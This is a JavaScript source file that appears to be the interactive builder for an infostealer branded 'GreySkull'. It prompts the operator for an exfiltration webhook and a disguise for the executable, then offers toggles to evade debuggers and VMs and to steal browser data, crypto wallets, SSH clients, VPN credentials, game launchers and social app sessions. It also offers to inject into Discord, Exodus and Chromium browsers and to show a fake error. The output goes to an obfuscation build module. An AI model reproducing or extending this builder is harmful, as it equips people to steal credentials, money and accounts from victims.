const chalkAnimation = require("chalk-animation");
const readline = require("readline");
const gradient = require("gradient-string");
const build = require("./obfu.js");
const { spawnSync } = require("child_process");
const path = require("path");

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});

function translateResponse(response) {
  response = response.toLowerCase().trim();
  if (response === "y" || response === "yes" || response === "oui") {
    return "yes";
  }

  return "no";
}

let currentQuestion = 1;
let config = {};

async function askQuestion(question) {
  return new Promise((resolve, reject) => {
    rl.question(
      gradient.atlas(`Question ${currentQuestion}: ${question}`),
      (answer) => {
        currentQuestion++;
        resolve(answer);
      }
    );
  });
}

async function completeConfiguration() {
  let g = `                                                   GreySkull       
                            
                                             uuuuuuu
                                         uu$$$$$$$$$$$uu
                                      uu$$$$$$$$$$$$$$$$$uu
                                     u$$$$$$$$$$$$$$$$$$$$$u
                                    u$$$$$$$$$$$$$$$$$$$$$$$u
                                   u$$$$$$$$$$$$$$$$$$$$$$$$$u
                                   u$$$$$$$$$$$$$$$$$$$$$$$$$u
                                   u$$$$$$"   "$$$"   "$$$$$$u
                                   "$$$$"      u$u       $$$$"
                                    $$$u       u$u       u$$$
                                    $$$u      u$$$u      u$$$
                                     "$$$$uu$$$   $$$uu$$$$"
                                      "$$$$$$$"   "$$$$$$$"
                                        u$$$$$$$u$$$$$$$u
                                         u$"$"$"$"$"$"$u
                              uuu        $$u$ $ $ $ $u$$       uuu
                             u$$$$        $$$$$u$u$u$$$       u$$$$
                              $$$$$uu      "$$$$$$$$$"     uu$$$$$$
                            u$$$$$$$$$$$uu    """""    uuuu$$$$$$$$$$
                            $$$$"""$$$$$$$$$$uuu   uu$$$$$$$$$"""$$$"
                             """      ""$$$$$$$$$$$uu ""$"""
                                       uuuu ""$$$$$$$$$$uuu
                              u$$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$
                              $$$$$$$$$$""""           ""$$$$$$$$$$$"
                               "$$$$$"                      ""$$$$""
                                 $$$"                         $$$$"⠀
                              `;
  let gf = chalkAnimation.radar(g);
  gf.start();

  setTimeout(async () => {
    gf.stop();

    const buildBatPath = path.join(__dirname, "script", "install.bat");
    const options = {
      cwd: path.join(__dirname, "script"),
      stdio: "inherit",
    };

    spawnSync(buildBatPath, [], options);

    console.clear();
    console.log(gradient.fruit(g));

    config["webhook"] = await askQuestion("Enter your webhook: ");
    config["name"] = await askQuestion("Enter your executable file name: ");
    config["license"] = await askQuestion(
      "Enter your executable file license: "
    );
    const description = await askQuestion(
      "Enter your executable file description: "
    );
    config["description"] = description + " by KSCH58";
    config["appFileDescription"] = description;
    config["blockdebug"] = translateResponse(
      await askQuestion("Do you want to block debug and VM ? [y/n]")
    );
    config["game"] = translateResponse(
      await askQuestion("Do you want to steal games ? [y/n]")
    );
    config["launchers"] = config["game"];
    config["inject"] = translateResponse(
      await askQuestion("Do you want to inject exodus/discord ? [y/n]")
    );
    config["sysinfo"] = translateResponse(
      await askQuestion("Do you want to steal system informations ? [y/n]")
    );
    config["clients"] = translateResponse(
      await askQuestion("Do you want to steal clients ssh ? [y/n]")
    );
    config["browsers"] = translateResponse(
      await askQuestion("Do you want to steal browsers ? [y/n]")
    );
    config["fakeerror"] = translateResponse(
      await askQuestion("Do you want to open a fake error ? [y/n]")
    );
    config["wallets"] = translateResponse(
      await askQuestion("Do you want to steal crypto wallets ? [y/n]")
    );
    config["vpn"] = translateResponse(
      await askQuestion("Do you want to steal vpn ? [y/n]")
    );
    config["chromeinjection"] = translateResponse(
      await askQuestion("Do you want to inject all chromium browsers ? [y/n]")
    );
    config["social"] = translateResponse(
      await askQuestion("Do you want to steal social app ? [y/n]")
    );

    rl.close();
    console.clear();
    await build.main(config);
  }, 5000);
}

completeConfiguration();
